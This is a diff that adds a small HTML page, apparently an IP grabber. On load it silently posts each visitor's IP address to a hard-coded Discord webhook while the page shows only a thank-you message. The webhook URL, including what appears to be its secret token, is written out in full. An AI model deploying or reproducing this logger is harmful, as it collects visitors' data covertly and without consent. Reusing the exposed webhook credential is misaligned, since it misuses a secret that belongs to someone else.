@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Send IP to Discord Webhook</title>
+    <script type="text/javascript">
+        function sendIP() {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://discord.com/api/webhooks/1208920932110966846/jZZITj9syS7Yjnwd2bbLFMJ7YDQU90zaphFQWCfjzfzM7Z_4VjN3UlA-LIVWP4Tq295a", true);
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            var ip = "<?php echo $_SERVER['REMOTE_ADDR'];?>";
+            var params = {
+                content: "Visitor's IP: " + ip
+            }
+            xhr.send(JSON.stringify(params));
+        }
+    </script>
+</head>
+<body onload="sendIP()">
+    <h1>Thank you for visiting!</h1>
+</body>
+</html>
